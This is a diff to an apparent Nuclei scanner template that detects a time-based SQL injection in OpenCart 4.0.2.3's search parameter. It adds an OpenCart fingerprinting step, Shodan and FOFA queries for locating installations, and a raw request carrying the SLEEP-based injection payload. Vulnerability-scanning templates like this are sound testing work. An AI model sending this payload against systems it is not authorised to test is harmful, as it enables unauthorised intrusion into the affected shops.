@@ -1,6 +1,7 @@
 id: opencart-core-sqli
+
 info:
-  name: OpenCart Core 4.0.2.3 - 'search' SQLi
+  name: OpenCart Core 4.0.2.3 'search' - SQL Injection
   author: Kazgangap
   severity: high
   description: |
@@ -8,18 +9,39 @@ info:
   reference:
     - https://www.exploit-db.com/exploits/51940
     - https://cxsecurity.com/issue/WLB-2024040004
+  metadata:
+    max-request: 2
+    fofa-query: icon_hash="-1443008128"
+    shodan-query: title:"OpenCart"
   tags: opencart,sqli
 
+flow: http(1) && http(2)
+
 http:
+
   - method: GET
     path:
-      - "{{BaseURL}}/index.php?route=product/search&search=') AND (SELECT 8368 FROM (SELECT(SLEEP(11)))uUDJ)-- Nabb"
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(header, "OCSESSID=")'
+          - 'contains_any(body, "opencart.com", "OpenCart is open source", "content=\"OpenCart")'
+        condition: or
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 15s
+        GET /index.php?route=product/search&search=')+AND+(SELECT+8368+FROM+(SELECT(SLEEP(7)))uUDJ)--+Nabb HTTP/1.1
+        Host: {{Hostname}}
 
     matchers-condition: and
     matchers:
       - type: dsl
         dsl:
-          - 'duration>=11'
+          - 'duration>=7'
 
       - type: status
         status:
